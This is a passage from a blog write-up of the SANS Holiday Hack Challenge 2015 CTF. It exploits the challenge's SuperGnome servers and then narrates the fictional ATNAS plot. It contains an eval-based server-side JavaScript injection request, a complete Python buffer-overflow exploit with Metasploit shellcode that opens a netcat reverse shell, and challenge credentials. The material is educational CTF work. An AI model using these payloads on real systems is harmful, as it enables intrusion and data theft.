+<p>SG-03 gnome.conf:</p>
+<pre><code>    Gnome Serial Number: **THX1138**
+    Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
+    Allow new subordinates?: YES
+    Camera monitoring?: YES
+    Audio monitoring?: YES
+    Camera update rate: 60min
+    Gnome mode: SuperGnome
+    Gnome name: SG-03
+    Allow file uploads?: YES
+    Allowed file formats: .png
+    Allowed file size: 512kb
+    Files directory: /gnome/www/files/
+</code></pre>
+<p>Vulnerability: NoSQL Injection<br />
+Gnome Serial Number: <strong>THX1138</strong> = [https://en.wikipedia.org/wiki/THX_1138]</p>
+<h3 id="sg-04">SG-04</h3>
+<p>Moving on to SuperGnome-04, we are able to login with the <code>admin:SittingOnAShelf</code>
+credentials. A quick look around the menus reveals a new section under <code>/files</code> called
+&ldquo;Upload New File&rdquo;. It allows us to select a post-process option for the uploaded file.</p>
+<p>Let&rsquo;s look at the gnome firmware for any vulnerabilities:</p>
+<p>{% codeblock index.js %}
+// FILES UPLOAD
+router.post('/files&rsquo;, upload.single(&lsquo;file&rsquo;), function(req, res, next) {
+if (sessions[sessionid].logged_in === true &amp;&amp; sessions[sessionid].user_level &gt; 99) { // NEDFORD: this should be 99 not 100 so admins can upload
+var msgs = [];
+file = req.file.buffer;
+if (req.file.mimetype === &lsquo;image/png&rsquo;) {
+msgs.push(&lsquo;Upload successful.');
+var postproc_syntax = req.body.postproc;
+console.log(&ldquo;File upload syntax:&rdquo; + postproc_syntax);
+if (postproc_syntax != &lsquo;none&rsquo; &amp;&amp; postproc_syntax !== undefined) {
+msgs.push(&lsquo;Executing post process&hellip;');
+var result;
+d.run(function() {
+<strong>result = eval('(&rsquo; + postproc_syntax + &lsquo;)');</strong>
+});
+// STUART: (WIP) working to improve image uploads to do some post processing.
+msgs.push(&lsquo;Post process result: ' + result);
+}
+msgs.push(&lsquo;File pending super-admin approval.');
+res.msgs = msgs;
+} else {
+msgs.push(&lsquo;File not one of the approved formats: .png&rsquo;);
+res.msgs = msgs;
+}
+} else
+title = &ldquo;sans holiday challenge 2015 writeup&rdquo;
+next();
+});
+{% endcodeblock %}</p>
+<p>There is one major problem with this section of code, that <code>eval</code> is very dangerous. Let&rsquo;s see if we can leverage it to perform some Sever Side Javascript Injection (SSJS). Here is my input from <em>Burp</em>:</p>
+<pre><code>    POST /files HTTP/1.1
+    Host: 52.192.152.132
+    User-Agent: merry xmas you filthy animal
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Referer: http://52.192.152.132/files
+    Cookie: sessionid=LRWk1JYQT2V8r6Xyu0th
+    Connection: close
+    Content-Type: multipart/form-data; boundary=---------------------------4590748351909491821833414779
+    Content-Length: 356
+
+    -----------------------------4590748351909491821833414779
+    Content-Disposition: form-data; name=&quot;postproc&quot;
+
+    **require('fs').readFileSync('/gnome/www/files/gnome.conf')**
+    -----------------------------4590748351909491821833414779
+    Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;foo.png&quot;
+    Content-Type: image/png
+
+    bar
+    -----------------------------4590748351909491821833414779--
+</code></pre>
+<p>Replacing the &ldquo;postproc&rdquo; call with our <code>readFileSync</code> command allows us
+to read the contents of gnome.conf. Grabbing the pcap and image just required some
+encoding due to the larger file sizes.</p>
+<pre><code>    require('fs').readFileSync('/gnome/www/files/20151203133815.zip','hex')
+</code></pre>
+<p>SG-04 gnome.conf:</p>
+<pre><code>    Gnome Serial Number: **BU22_1729_2716057**
+    Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
+    Allow new subordinates?: YES
+    Camera monitoring?: YES
+    Audio monitoring?: YES
+    Camera update rate: 60min
+    Gnome mode: SuperGnome
+    Gnome name: SG-04
+    Allow file uploads?: YES
+    Allowed file formats: .png
+    Allowed file size: 512kb
+    Files directory: /gnome/www/files/
+</code></pre>
+<p>Vulnerability: SSJS - Server Side Javascript Injection<br />
+Gnome Serial Number: <strong>BU22_1729_2716057</strong> = [https://en.wikipedia.org/wiki/Bender_(Futurama)]</p>
+<h3 id="sg-05">SG-05</h3>
+<p>This one got me. I knew that it involved the code provided on the other SuperGnomes, sgnet and sgstatd.</p>
+<p>I looked at the source code and determined that there was an extra port open on SG-05.</p>
+<p>I probed it with netcat:</p>
+<pre><code>    mike@foo:~/sans-holiday-hack-2015$ nc 54.233.105.81 4242
+
+    Welcome to the SuperGnome Server Status Center!
+    Please enter one of the following options:
+
+    1 - Analyze hard disk usage
+    2 - List open TCP sockets
+    3 - Check logged in users
+</code></pre>
+<p>Interesting. I explored each of the menu options, but did not detect anything that
+would assist with exploitation. Let&rsquo;s take a look at the source code:</p>
+<p>{% codeblock sgtatd.c %}
+if (choice != 2) {
+write(sd, &ldquo;\nWelcome to the SuperGnome Server Status Center!\n&rdquo;, 51);
+write(sd, &ldquo;Please enter one of the following options:\n\n&rdquo;, 45);
+write(sd, &ldquo;1 - Analyze hard disk usage\n&rdquo;, 28);
+write(sd, &ldquo;2 - List open TCP sockets\n&rdquo;, 26);
+write(sd, &ldquo;3 - Check logged in users\n&rdquo;, 27);
+fflush(stdout);</p>
+<p>recv(sd, &amp;choice, 1, 0);</p>
+<p>switch (choice) {
+case 49:
+case 50:
+case 51:
+<strong>case 88:</strong>
+write(sd, &ldquo;\n\nH&rdquo;, 4);
+<em>Truncated</em>
+write(sd, &ldquo;Enter a short message to share with GnomeNet (please allow 10 seconds) =&gt; &ldquo;, 75);
+fflush(stdin);
+sgstatd(sd);
+{% endcodeblock %}</p>
+<p>Hm, the switch statement contains an extra case. The other case values appear
+to refer to the decimal value of the character (1=49, 2=50, 51=3). A quick look
+at an ASCII chart tells us that <code>88 = &lsquo;X&rsquo;</code>.</p>
+<p>Let&rsquo;s see if we can trigger the hidden menu item:</p>
+<p>{% codeblock lang:bash %}
+mike@foo:~/sans-holiday-hack-2015$ nc 54.233.105.81 4242</p>
+<p>Welcome to the SuperGnome Server Status Center!
+Please enter one of the following options:</p>
+<p>1 - Analyze hard disk usage
+2 - List open TCP sockets
+3 - Check logged in users
+X</p>
+<p>Hidden command detected!</p>
+<p>Enter a short message to share with GnomeNet (please allow 10 seconds) =&gt;
+This function is protected!
+{% endcodeblock %}</p>
+<p>Looking at the source code, we see some interesting items:</p>
+<p>{% codeblock sgtatd.c %}
+int sgstatd(sd)
+{
+<strong>asm</strong>(&ldquo;movl $0xe4ffffe4, -4(%ebp)&quot;);
+//Canary pushed</p>
+<pre><code>char bin[100];
+write(sd, &quot;\nThis function is protected!\n&quot;, 30);
+fflush(stdin);
+//recv(sd, &amp;bin, 200, 0);
+sgnet_readn(sd, &amp;bin, 200);
+__asm__(&quot;movl -4(%ebp), %edx\n\t&quot; &quot;xor $0xe4ffffe4, %edx\n\t&quot;    // Canary checked
+    &quot;jne sgnet_exit&quot;);
+return 0;
+</code></pre>
+<p>}
+{% endcodeblock %}</p>
+<ol>
+<li>The code allocates a 100 byte buffer then reads and stores 200 bytes.</li>
+<li>There is a mention of a canary in the function.</li>
+</ol>
+<p>I fired up <em>Kali</em> and setup a nice test lab to develop my code to exploit the buffer
+overflow. I grabbed the compiled version of the binary from the firmware image extract.</p>
+<p>I like using <em>pattern_create.rb</em> for interacting with buffers instead of trying to guesstimate:</p>
+<pre><code>    root@kali-32:~# /usr/share/metasploit-framework/tools/pattern_create.rb 175
+    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7A
+</code></pre>
+<p>Let&rsquo;s take a look at the sgstatd function in <strong>gdb</strong>:</p>
+<p>{% codeblock lang:bash %}
+(gdb) disass sgstatd
+Dump of assembler code for function sgstatd:
+0x0804935d &lt;+0&gt;:    push   %ebp
+0x0804935e &lt;+1&gt;:    mov    %esp,%ebp
+0x08049360 &lt;+3&gt;:    sub    $0x88,%esp
+0x08049366 &lt;+9&gt;:    movl   $0xe4ffffe4,-0x4(%ebp)
+0x0804936d &lt;+16&gt;:    movl   $0x1e,0x8(%esp)
+0x08049375 &lt;+24&gt;:    movl   $0x8049d53,0x4(%esp)
+0x0804937d &lt;+32&gt;:    mov    0x8(%ebp),%eax
+0x08049380 &lt;+35&gt;:    mov    %eax,(%esp)
+0x08049383 &lt;+38&gt;:    call   0x8048af0 <a href="mailto:write@plt">write@plt</a>
+0x08049388 &lt;+43&gt;:    mov    0x804b2e0,%eax
+0x0804938d &lt;+48&gt;:    mov    %eax,(%esp)
+0x08049390 &lt;+51&gt;:    call   0x80489a0 <a href="mailto:fflush@plt">fflush@plt</a>
+0x08049395 &lt;+56&gt;:    movl   $0xc8,0x8(%esp)
+0x0804939d &lt;+64&gt;:    lea    -0x6c(%ebp),%eax
+0x080493a0 &lt;+67&gt;:    mov    %eax,0x4(%esp)
+0x080493a4 &lt;+71&gt;:    mov    0x8(%ebp),%eax
+0x080493a7 &lt;+74&gt;:    mov    %eax,(%esp)
+0x080493aa &lt;+77&gt;:    call   0x804990b &lt;sgnet_readn&gt;
+0x080493af &lt;+82&gt;:    mov    -0x4(%ebp),%edx
+0x080493b2 &lt;+85&gt;:    xor    $0xe4ffffe4,%edx
+0x080493b8 &lt;+91&gt;:    jne    0x804933f &lt;sgnet_exit&gt;
+0x080493be &lt;+97&gt;:    mov    $0x0,%eax
+0x080493c3 &lt;+102&gt;:    leave
+0x080493c4 &lt;+103&gt;:    ret
+End of assembler dump.
+{% endcodeblock %}</p>
+<p>It appears that the canary is a static value <code>0xe4ffffe4</code>. &ldquo;It&rsquo;s a bold strategy, Cotton. Let&rsquo;s see if it pays off for &lsquo;em.&rdquo;</p>
+<p>First step was loading some configuration options into gdb to disable the alarm and follow the fork. I&rsquo;ve included them for reference:</p>
+<pre><code>    set follow-fork-mode child
+    set detach-on-fork off
+    set follow-exec-mode new
+    handle SIGALRM ignore
+</code></pre>
+<p>While testing the message &ldquo;Canary not repaired.&rdquo; was firing, I was able to pinpoint the canary location at 105 characters. After setting my canary value, I ran into my next challenge: ASLR. I ended up using a common bypass technique by tracking down a &ldquo;jmp esp&rdquo; gadget using the tool <em>ROPgadget.py</em>:</p>
+<pre><code>    root@kali-32:~/Desktop# python ROPgadget/ROPgadget.py --binary \_giyh-firmware-dump.bin.extracted/squashfs-root/usr/bin/sgstatd | grep &quot;jmp&quot;
+    0x08049365 : add bh, al ; inc ebp ; cld ; in al, -1 ; jmp esp
+    0x08049363 : add byte ptr [eax], al ; add bh, al ; inc ebp ; cld ; in al, -1 ; jmp esp
+    0x080493ae : add byte ptr [ebx - 0xd7e03ab], cl ; in al, -1 ; jmp esp
+    0x08049368 : cld ; in al, -1 ; jmp esp
+    0x08049369 : in al, -1 ; jmp esp
+    0x08049367 : inc ebp ; cld ; in al, -1 ; jmp esp
+    **0x0804936b : jmp esp**
+    0x08048c40 : ljmp 0xd1d0011f, 0x75f8 ; add dh, bl ; ret
+</code></pre>
+<p>I fired up <em>metasploit</em> to craft my payload. Important note: I modified my output to remove the IP of my server. I don&rsquo;t need any copy and paste &ldquo;mistakes&rdquo; occurring <code> :) </code>!</p>
+<p>{% codeblock lang:bash %}
+root@kali-32:~# msfconsole
+msf &gt; use payload/linux/x86/exec
+msf payload(exec) &gt; set CMD &lsquo;nc 127.0.0.1 6666 -e /bin/bash&rsquo;
+CMD =&gt; nc 127.0.0.1 6666 -e /bin/bash
+msf payload(exec) &gt; generate</p>
+<h1 id="linuxx86exec---70-bytes">linux/x86/exec - 70 bytes</h1>
+<h1 id="httpwwwmetasploitcom"><a href="http://www.metasploit.com">http://www.metasploit.com</a></h1>
+<h1 id="verbosefalse-prependforkfalse-prependsetresuidfalse">VERBOSE=false, PrependFork=false, PrependSetresuid=false,</h1>
+<h1 id="prependsetreuidfalse-prependsetuidfalse">PrependSetreuid=false, PrependSetuid=false,</h1>
+<h1 id="prependsetresgidfalse-prependsetregidfalse">PrependSetresgid=false, PrependSetregid=false,</h1>
+<h1 id="prependsetgidfalse-prependchrootbreakfalse">PrependSetgid=false, PrependChrootBreak=false,</h1>
+<h1 id="appendexitfalse-cmdnc-127001-6666--e-binbash">AppendExit=false, CMD=nc 127.0.0.1 6666 -e /bin/bash</h1>
+<p>buf =
+&ldquo;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73&rdquo; +
+&ldquo;\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x1f\x00\x00&rdquo; +
+&ldquo;\x00\x6e\x63\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x20&rdquo; +
+&ldquo;\x36\x36\x36\x36\x20\x2d\x65\x20\x2f\x62\x69\x6e\x2f\x62&rdquo; +
+&ldquo;\x61\x73\x68\x00\x57\x53\x89\xe1\xcd\x80&rdquo;
+{% endcodeblock %}</p>
+<p>Here is my final exploit:
+{% codeblock lang:python %}
+#!/usr/bin/env python
+import socket
+import time</p>
+<p>host = &lsquo;54.233.105.81&rsquo;
+port = 4242</p>
+<h1 id="initial-connection">Initial connection</h1>
+<p>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))</p>
+<h1 id="send-x-and-wait">Send X and wait</h1>
+<p>print s.recv(1)
+s.send(&lsquo;X&rsquo;)
+time.sleep(3)</p>
+<h1 id="variables-for-buffer">Variables for buffer</h1>
+<p>a = &ldquo;\x41&rdquo; * 104
+canary = &ldquo;\xe4\xff\xff\xe4&rdquo;
+b = &ldquo;\x42\x42\x42\x42&rdquo;
+jmp = &ldquo;\x6b\x93\x04\x08&rdquo;</p>
+<h1 id="adding-payload">Adding Payload</h1>
+<p>payload = &ldquo;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73&rdquo;
+payload += &ldquo;\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x1f\x00\x00&rdquo;
+payload += &ldquo;\x00\x6e\x63\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x20&rdquo;
+payload += &ldquo;\x36\x36\x36\x36\x20\x2d\x65\x20\x2f\x62\x69\x6e\x2f\x62&rdquo;
+payload += &ldquo;\x61\x73\x68\x00\x57\x53\x89\xe1\xcd\x80&rdquo;</p>
+<h1 id="craft-and-send">Craft and send</h1>
+<p>buffer = a + canary + b + jmp + payload
+s.send(buffer)
+s.close()
+{% endcodeblock %}
+I started up a netcat listener on my server to catch the connection:</p>
+<p>{% codeblock lang:bash %}
+mike@foo:~$ nc -nlvp 3535
+Listening on [0.0.0.0] (family 0, port 3535)
+Connection from [54.233.105.81] port 3535 [tcp/*] accepted (family 2, sport 45173)
+id
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+hostname
+sg5
+{% endcodeblock %}</p>
+<p>Nice! Next, I setup some netcat tunnels and exfiled the data located in <code>/gnome/www/files/</code>.</p>
+<p>SG-05 gnome.conf:</p>
+<pre><code>    Gnome Serial Number: **4CKL3R43V4**
+    Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
+    Allow new subordinates?: YES
+    Camera monitoring?: YES
+    Audio monitoring?: YES
+    Camera update rate: 60min
+    Gnome mode: SuperGnome
+    Gnome name: SG-05
+    Allow file uploads?: YES
+    Allowed file formats: .png
+    Allowed file size: 512kb
+    Files directory: /gnome/www/files/
+</code></pre>
+<p>Vulnerability: Buffer Overflow<br />
+Gnome Serial Number: <strong>4CKL3R43V4</strong> = [http://www.sou.edu/cs/lynnackler.html]</p>
+<p>Just in case anyone was curious, I mentioned earlier that I did not finish SG-05 before the submission deadline. I was close, but finding the JMP ESP to bypass ASLR did not happen until after I submitted my report and finished the Netflix series. (Ha!)</p>
+<p>I love the detail and thought put into every little part of this challenge, even the gnome serial numbers had significance.</p>
+<h2 id="part-5-sinister-plot-and-attribution">Part 5: Sinister Plot and Attribution</h2>
+<h3 id="packet-capture-evidence">Packet Capture Evidence</h3>
+<p>I obtained these packet capture from each of the SuperGnomes. I opened each one
+in <em>wireshark</em> and &lsquo;Followed the TCP stream&rsquo; to reveal a number of emails.</p>
+<p>SG-01:</p>
+<pre><code>    From: &quot;c&quot; &lt;c@atnascorp.com&gt;
+    To: &lt;jojo@atnascorp.com&gt;
+    Subject: GiYH Architecture
+    Date: Fri, 26 Dec 2014 10:10:55 -0500
+
+    JoJo,
+
+    As you know, I hired you because you are the best architect in town for a
+    distributed surveillance system to satisfy our rather unique business
+    requirements.  We have less than a year from today to get our final plans in
+    place.  Our schedule is aggressive, but realistic.
+
+    I've sketched out the overall Gnome in Your Home architecture in the diagram
+    attached below.  Please add in protocol details and other technical
+    specifications to complete the architectural plans.
+
+    Remember: to achieve our goal, we must have the infrastructure scale to
+    upwards of 2 million Gnomes.  Once we solidify the architecture, you'll work
+    with the hardware team to create device specs and we'll start procuring
+    hardware in the February 2015 timeframe.
+
+    I've also made significant progress on distribution deals with retailers.
+
+    Thoughts?
+
+    Looking forward to working with you on this project!
+
+    -C
+</code></pre>
+<img src="/images/sans_2015/gnome-arch.jpg"/>
+<p>SG-02:</p>
+<pre><code>    From: &quot;c&quot; &lt;c@atnascorp.com&gt;
+    To: &lt;supplier@ginormouselectronicssupplier.com&gt;
+    Subject: =?us-ascii?Q?Large_Order_-\_Immediate_Attention_Required?=
+    Date: Wed, 25 Feb 2015 09:30:39 -0500
+
+    Maratha,
+
+    As a follow-up to our phone conversation, we'd like to proceed with an order
+    of parts for our upcoming product line.  We'll need two million of each of
+    the following components:
+
+    + Ambarella S2Lm IP Camera Processor System-on-Chip (with an ARM Cortex A9
+    CPU and Linux SDK)
+    + ON Semiconductor AR0330: 3 MP 1/3&quot; CMOS Digital Image Sensor
+    + Atheros AR6233X Wi-Fi adapter
+    + Texas Instruments TPS65053 switching power supply
+    + Samsung K4B2G16460 2GB SSDR3 SDRAM
+    + Samsung K9F1G08U0D 1GB NAND Flash
+
+    Given the volume of this purchase, we fully expect the 35% discount you
+    mentioned during our phone discussion.  If you cannot agree to this pricing,
+    we'll place our order elsewhere.
+
+    We need delivery of components to begin no later than April 1, 2015, with
+    250,000 units coming each week, with all of them arriving no later than June
+    1, 2015.
+
+    Finally, as you know, this project requires the utmost secrecy.   Tell NO
+    ONE about our order, especially any nosy law enforcement authorities.
+
+    Regards,
+
+    -CW
+</code></pre>
+<p>SG-03:</p>
+<pre><code>    From: &quot;c&quot; &lt;c@atnascorp.com&gt;
+    To: &lt;burglerlackeys@atnascorp.com&gt;
+    Subject: All Systems Go for Dec 24, 2015
+    Date: Tue, 1 Dec 2015 11:33:56 -0500
+
+    My Burgling Friends,
+
+    Our long-running plan is nearly complete, and I'm writing to share the date
+    when your thieving will commence!  On the morning of December 24, 2015, each
+    individual burglar on this email list will receive a detailed itinerary of
+    specific houses and an inventory of items to steal from each house, along
+    with still photos of where to locate each item.  The message will also
+    include a specific path optimized for you to hit your assigned houses
+    quickly and efficiently the night of December 24, 2015 after dark.
+
+    Further, we've selected the items to steal based on a detailed analysis of
+    what commands the highest prices on the hot-items open market.  I caution
+    you - steal only the items included on the list.  DO NOT waste time grabbing
+    anything else from a house.  There's no sense whatsoever grabbing crumbs too
+    small for a mouse!
+
+    As to the details of the plan, remember to wear the Santa suit we provided
+    you, and bring the extra large bag for all your stolen goods.
+
+    If any children observe you in their houses that night, remember to tell
+    them that you are actually &quot;Santy Claus&quot;, and that you need to send the
+    specific items you are taking to your workshop for repair.  Describe it in a
+    very friendly manner, get the child a drink of water, pat him or her on the
+    head, and send the little moppet back to bed.  Then, finish the deed, and
+    get out of there.  It's all quite simple - go to each house, grab the loot,
+    and return it to the designated drop-off area so we can resell it.  And,
+    above all, avoid Mount Crumpit!
+
+    As we agreed, we'll split the proceeds from our sale 50-50 with each
+    burglar.
+
+    Oh, and I've heard that many of you are asking where the name ATNAS comes
+    from.  Why, it's reverse SANTA, of course.  Instead of bringing presents on
+    Christmas, we'll be stealing them!
+
+    Thank you for your partnership in this endeavor.
+
+    Signed:
+
+    -CLW
+    President and CEO of ATNAS Corporation
+</code></pre>
+<p>SG-04:</p>
+<pre><code>    From: &quot;c&quot; &lt;c@atnascorp.com&gt;
+    To: &lt;psychdoctor@whovillepsychiatrists.com&gt;
+    Subject: Answer To Your Question
+    Date: Thu, 3 Dec 2015 13:38:15 -0500
+
+    Dr. O'Malley,
+
+    In your recent email, you inquired:
+
+    \&gt; When did you first notice your anxiety about the holiday season?
+
+    Anxiety is hardly the word for it.  It's a deep-seated hatred, Doctor.
+
+    Before I get into details, please allow me to remind you that we operate
+    under the strictest doctor-patient confidentiality agreement in the
+    business.  I have some very powerful lawyers whom I'd hate to invoke in the
+    event of some leak on your part.  I seek your help because you are the best
+    psychiatrist in all of Who-ville.
+
+    To answer your question directly, as a young child (I must have been no more
+    than two), I experienced a life-changing interaction.  Very late on
+    Christmas Eve, I was awakened to find a grotesque green Who dressed in a
+    tattered Santa Claus outfit, standing in my barren living room, attempting
+    to shove our holiday tree up the chimney.  My senses heightened, I put on my
+    best little-girl innocent voice and asked him what he was doing.  He
+    explained that he was &quot;Santy Claus&quot; and needed to send the tree for repair.
+    I instantly knew it was a lie, but I humored the old thief so I could escape
+    to the safety of my bed.  That horrifying interaction ruined Christmas for
+    me that year, and I was terrified of the whole holiday season throughout my
+    teen years.
+
+    I later learned that the green Who was known as &quot;the Grinch&quot; and had lost
+    his mind in the middle of a crime spree to steal Christmas presents.  At the
+    very moment of his criminal triumph, he had a pitiful change of heart and
+    started playing all nicey-nice.  What an amateur!  When I became an adult,
+    my fear of Christmas boiled into true hatred of the whole holiday season.  I
+    knew that I had to stop Christmas from coming.  But how?
+
+    I vowed to finish what the Grinch had started, but to do it at a far larger
+    scale.  Using the latest technology and a distributed channel of burglars,
+    we'd rob 2 million houses, grabbing their most precious gifts, and selling
+    them on the open market.  We'll destroy Christmas as two million homes full
+    of people all cry &quot;BOO-HOO&quot;, and we'll turn a handy profit on the whole
+    deal.
+
+    Is this &quot;wrong&quot;?  I simply don't care.  I bear the bitter scars of the
+    Grinch's malfeasance, and singing a little &quot;Fahoo Fores&quot; isn't gonna fix
+    that!
+
+    What is your advice, doctor?
+
+    Signed,
+
+    Cindy Lou Who
+</code></pre>
+<p>SG-05:</p>
+<pre><code>    From: &quot;Grinch&quot; &lt;grinch@who-villeisp.com&gt;
+    To: &lt;c@atnascorp.com&gt;
+    Subject: My Apologies &amp; Holiday Greetings
+    Date: Tue, 15 Dec 2015 16:09:40 -0500
+
+    Dear Cindy Lou,
+
+    I am writing to apologize for what I did to you so long ago.  I wronged you
+    and all the Whos down in Who-ville due to my extreme misunderstanding of
+    Christmas and a deep-seated hatred.  I should have never lied to you, and I
+    should have never stolen those gifts on Christmas Eve.  I realize that even
+    returning them on Christmas morn didn't erase my crimes completely.  I seek
+    your forgiveness.
+
+    You see, on Mount Crumpit that fateful Christmas morning, I learned th[4 bytes missing in capture file]at
+    Christmas doesn't come from a store.  In fact, I discovered that Christmas
+    means a whole lot more!
+
+    When I returned their gifts, the Whos embraced me.  They forgave.  I was
+    stunned, and my heart grew even more.  Why, they even let me carve the roast
+    beast!  They demonstrated to me that the holiday season is, in part, about
+    forgiveness and love, and that's the gift that all the Whos gave to me that
+    morning so long ago.  I honestly tear up thinking about it.
+
+    I don't expect you to forgive me, Cindy Lou.  But, you have my deepest and
+    most sincere apologies.
+
+    And, above all, don't let my horrible actions from so long ago taint you in
+    any way.  I understand you've grown into an amazing business leader.  You
+    are a precious and beautiful Who, my dear.  Please use your skills wisely
+    and to help and support your fellow Who, especially during the holidays.
+
+    I sincerely wish you a holiday season full of kindness and warmth,
+
+    --The Grinch
+</code></pre>
+<p>It is also worth noting that we were able to collect Cindy&rsquo;s password from this pcap:</p>
+<pre><code>    User: c
+    Password: AllYourPresentsAreBelongToMe
+</code></pre>
+<p>104.196.40.60 is the IP she connects to&hellip;</p>
+<img src="/images/sans_2015/tom-says-no.png"/>
+<p>Maybe next time!</p>
+<h3 id="image-evidence">Image Evidence</h3>
+<p>I collected up each of the staticky images from the SuperGnomes and used the tool
+<em>Stegsolve.jar</em> to xor the images and reveal the final image:</p>
+<img src="/images/sans_2015/clw-desk.png"/>
+<p><strong>9) Based on evidence you recover from the SuperGnomes’ packet capture ZIP files and any staticky images you find, what is the nefarious plot of ATNAS Corporation?</strong></p>
+<p>After reviewing all of the evidence in the packet captures and images, we discover the nefarious plot of the ATNAS corp. Cindy Lou Who was traumatized by
+the witnessing the actions of the Grinch on that Christmas night. She has grown to hate Christmas and believes she can improve on the Grinch&rsquo;s plan. Her plot is to distribute gnomes to as many homes as possible by Dec. 24.</p>
+<p>The gnomes purpose is to gather information about the households, specifically the belongings in the homes. This information gathering includes taking still snapshots of the rooms they are placed in and sniffing network traffic for specific terms (outlined in sniffer_hit_list.txt). All of this info is sent to the associated SuperGnomes where it will be reviewed by ATNAS. ATNAS will use this information to organize and deploy burglars, dressed as Santa, to the homes to steal specific presents. These items will be sold and the profits will be split 50/50 between the ATNAS corp and the burglars.</p>
+<p>The summary of the plan is revealed very eloquently by Cindy:</p>
+<pre><code>    &quot;Oh, and I've heard that many of you are asking where the name ATNAS comes from. 
+    Why, it's reverse SANTA, of course. Instead of bringing presents on Christmas, 
+    we'll be stealing them.&quot;
+</code></pre>
+<p><strong>10) Who is the villain behind the nefarious plot.</strong></p>
+<p>As we can see in the email and photo evidence, Cindy Lou Who, President and CEO of ATNAS Corporation, is the mastermind behind the nefarious plot.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>What a great challenge and amazing learning experience. I would like to blame
+Netflix and &ldquo;Making a Murderer&rdquo; for sabotaging and preventing me from solving
+SG-05 before the submission deadline. :)</p>
+<p>In all seriousness, I would like to thank all the folks over at SANS and CounterHack
+for their amazing work! I cannot wait to see what they have in store for next year!</p>
+<img src="/images/sans_2015/ed.png"/>
+<p>Had to include a final picture with one of my favorite people and birthday-sharer, <a href="https://twitter.com/edskoudis">Ed Skoudis</a>.</p>
+<p>Thanks!</p>
+<p>Mike</p>
+    </div>
+    <footer>
+      <div class="stats">
+  
+    <ul class="categories">
+      
+        
+          <li><a class="article-terms-link" href="/categories/ctf/">CTF</a></li>
+        
+          <li><a class="article-terms-link" href="/categories/sans-holiday-hack/">SANS Holiday Hack</a></li>
+        
+      
+    </ul>
+  
+  
+    <ul class="tags">
+      <li>None</li>
+    </ul>
+  
+</div>
+
+    </footer>
+  </article>
+  
+    
+  <article class="post">
+    
+    <div>
+      <h2 id="say-something">Say Something</h2>
+        <form id="comment-form" class="new-comment" method="POST">
+          
+          <h3 class='reply-notice hidden'>
+            <span class='reply-name'></span>
+          </h3>
+
+          
+          <input type="hidden" name="options[entryId]" value="eb841e9cd85cb0426ca1a44c32f3b8d4">
+          <input type='hidden' name='fields[replyThread]' value=''>
+          <input type='hidden' name='fields[replyID]' value=''>
+          <input type='hidden' name='fields[replyName]' value=''>
+
+          
+          <input required name='fields[name]' type='text' placeholder='Your Name'>
+          <input name='fields[website]' type='text' placeholder='Your Website'>
+          <input required name='fields[email]' type='email' placeholder='Your Email'>
+          <textarea required name='fields[body]' placeholder='Your Message' rows='10'></textarea>
+
+          
+          
+
+          
+          <div class='submit-notice'>
+            <strong class='submit-notice-text submit-success hidden'>Thanks for your comment! It will be shown on the site once it has been approved.</strong>
+            <strong class='submit-notice-text submit-failed hidden'>Sorry, there was an error with your submission. Please make sure all required fields have been completed and try again.</strong>
+          </div>
+
+          
+          <input type='submit' value='Submit' class='button'>
+          <input type='submit' value='Submitted' class='hidden button' disabled>
+          <input type='reset' value='Reset' class='button'>
+        </form>
+    </div>
+
+    
+    <div>
+      <h2>Comments</h2>
+    </div>
+  </article>
+
+
+  
+  <div class="pagination">
+    
+      <a href="/blog/gse-results/" class="button left"><span>GSE Results</span></a>
+    
+    
+      <a href="/blog/exploit-exercises-nebula-level15/" class="button right"><span>Exploit Exercises Nebula Level15</span></a>
+    
+  </div>
+
+      </main>
+      <section id="site-sidebar">
+  
+    <section id="recent-posts">
+      <header>
+        <h1>Recent Posts</h1>
+      </header>
+      
+      <article class="mini-post">
+          
+        <header>
+          <h2><a href="/blog/synology-pushover-notifications/">Synology Pushover Notifications </a></h2>
+          <time class="published" datetime="2020-10-01 00:00:00 &#43;0000 UTC">October 1, 2020</time>
+        </header>
+      </article>
+      
+      <article class="mini-post">
+          
+        <header>
+          <h2><a href="/blog/metasploitctf2020-queen-of-diamonds-write-up/">Metasploit CTF 2020 - Queen Of Diamonds Write-Up</a></h2>
+          <time class="published" datetime="2020-02-04 00:00:00 &#43;0000 UTC">February 4, 2020</time>
+        </header>
+      </article>
+      
+      <article class="mini-post">
+          
+        <header>
+          <h2><a href="/blog/sans-holiday-challenge-2018-writeup/">SANS Holiday Challenge 2018 - Writeup</a></h2>
+          <time class="published" datetime="2019-01-17 00:00:00 &#43;0000 UTC">January 17, 2019</time>
+        </header>
+      </article>
+      
+      <article class="mini-post">
+          
+        <header>
+          <h2><a href="/blog/googlectf-spotted-quoll-write-up/">GoogleCTF - Spotted Quoll Write-Up</a></h2>
+          <time class="published" datetime="2016-05-01 00:00:00 &#43;0000 UTC">May 1, 2016</time>
+        </header>
+      </article>
+      
+      <article class="mini-post">
+          
+        <header>
+          <h2><a href="/blog/gse-results/">GSE Results</a></h2>
+          <time class="published" datetime="2016-04-21 00:00:00 &#43;0000 UTC">April 21, 2016</time>
+        </header>
+      </article>
+      
+      
+        <footer>
